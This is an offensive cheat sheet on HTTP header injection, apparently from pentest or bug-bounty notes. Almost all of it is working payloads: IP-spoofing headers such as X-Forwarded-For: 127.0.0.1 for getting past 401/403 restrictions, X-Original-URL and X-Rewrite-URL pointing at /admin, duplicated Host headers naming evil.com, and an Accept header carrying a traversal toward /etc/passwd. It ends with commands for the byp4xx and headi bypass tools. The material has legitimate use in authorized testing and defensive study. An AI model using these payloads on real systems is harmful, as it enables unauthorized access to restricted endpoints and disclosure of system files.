# Header injections

## Headers

```bash
# Add something like 127.0.0.1, localhost, 192.168.1.2, target.com or /admin, /console
Client-IP:
Connection:
Contact:
Forwarded:
From:
Host:
Origin:
Referer:
True-Client-IP:
X-Client-IP:
X-Custom-IP-Authorization:
X-Forward-For:
X-Forwarded-For:
X-Forwarded-Host:
X-Forwarded-Server:
X-Host:
X-Original-URL:
X-Originating-IP:
X-Real-IP:
X-Remote-Addr:
X-Remote-IP:
X-Rewrite-URL:
X-Wap-Profile:

# Try to repeat same Host header 2 times
Host: legit.com
Stuff: stuff
Host: evil.com

# Bypass type limit
Accept: application/json, text/javascript, */*; q=0.01
Accept: ../../../../../../../../../etc/passwd{{'

# Try to change the HTTP version from 1.1 to HTTP/0.9 and remove the host header

# 401/403 bypasses 
# Whitelisted IP 127.0.0.1 or localhost
Client-IP: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For: localhost
Forwarded: 127.0.0.1
Forwarded: localhost
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forward: 127.0.0.1
X-Forward: localhost
X-Forwarded-By: 127.0.0.1
X-Forwarded-By: localhost
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For-Original: localhost
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-Server: 127.0.0.1
X-Forwarded-Server: localhost
X-Forwarded: 127.0.0.1
X-Forwarded: localhost
X-Forwared-Host: 127.0.0.1
X-Forwared-Host: localhost
X-Host: 127.0.0.1
X-Host: localhost
X-HTTP-Host-Override: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-Addr: localhost
X-Remote-IP: 127.0.0.1

# Fake Origin - make GET request to accesible endpoint with:
X-Original-URL: /admin
X-Override-URL: /admin
X-Rewrite-URL: /admin
Referer: /admin
# Also try with absoulte url https:/domain.com/admin

# Method Override
X-HTTP-Method-Override: PUT

# Provide full path GET
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com

# Add line wrapping
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com

# Wordlists
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers
https://github.com/danielmiessler/SecLists/tree/bbb4d86ec1e234b5d3cfa0a4ab3e20c9d5006405/Miscellaneous/web/http-request-headers
```

## Tools

```bash
# https://github.com/lobuhi/byp4xx
./byp4xx.sh https://url/path
# https://github.com/OdinF13/Bug-Bounty-Scripts

# https://github.com/mlcsec/headi
headi -url http://target.com/admin
```

